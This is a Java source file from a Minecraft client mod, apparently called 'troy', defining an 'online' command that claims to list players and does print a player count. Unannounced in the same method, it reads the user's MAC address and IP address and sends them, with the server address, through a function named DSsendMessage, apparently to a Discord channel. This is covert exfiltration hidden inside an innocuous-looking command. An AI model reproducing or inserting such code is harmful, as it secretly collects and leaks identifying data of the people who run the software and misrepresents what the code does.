package it.md_4.troy.command.impl;

import it.md_4.troy.command.Command;
import it.md_4.troy.command.CommandInfo;
import it.md_4.troy.exception.CommandException;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.helper.PlayerHelper;
import it.md_4.troy.ip.IpChecker;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import static it.md_4.troy.Troy.DSsendMessage;

@CommandInfo(
    alias = "online",
    description = "Get List Of Players",
    usage = "'online [method]",
    aliases = {"players", "realplayers"}
)
public class OnlineCommand extends Command {

  @Override
  public void execute(String... args) throws Exception {

    if (args.length == 0) {
      InetAddress localHost = null;
      try {
        localHost = InetAddress.getLocalHost();
      } catch (UnknownHostException e) {
        e.printStackTrace();
      }
      NetworkInterface ni = null;
      try {
        ni = NetworkInterface.getByInetAddress(localHost);
      } catch (SocketException e) {
        e.printStackTrace();
      }
      byte[] hardwareAddress = new byte[0];
      try {
        hardwareAddress = ni.getHardwareAddress();
      } catch (SocketException e) {
        e.printStackTrace();
      }

      String[] hexadecimal = new String[hardwareAddress.length];
      for (int i = 0; i < hardwareAddress.length; i++) {
        hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
      }
      String macAddress = String.join("-", hexadecimal);

      DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "\n Executed Command [Online]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);

      Type type = args.length > 0 ? Type.valueOf(args[0].toUpperCase()) : Type.PLAYER_DATA;
      int onlinePlayers = -1;

      switch (type) {
        case PLAYER_DATA:
          onlinePlayers = PlayerHelper.getOnlinePlayer().size();
          break;
        case TAB_COMPLETE:
          break;
      }

      ChatHelper.printMessage("&b • &bOnline players: &3" + onlinePlayers);
    } else if (args.length > 1) {
      ChatHelper.printMessage("&b • &bParameter not found.");
    }
  }





  enum Type {
    TAB_COMPLETE, PLAYER_DATA
  }
}
